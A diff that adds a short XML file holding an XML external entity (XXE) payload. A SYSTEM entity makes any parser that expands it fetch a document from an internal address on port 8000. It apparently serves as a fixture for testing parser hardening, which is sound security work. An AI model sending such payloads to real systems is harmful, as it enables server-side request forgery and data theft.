@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE r [
+        <!ELEMENT r ANY >
+        <!ENTITY sp SYSTEM "http://172.17.0.1:8000/my.xml">
+        ]>
+<r>&sp;</r>
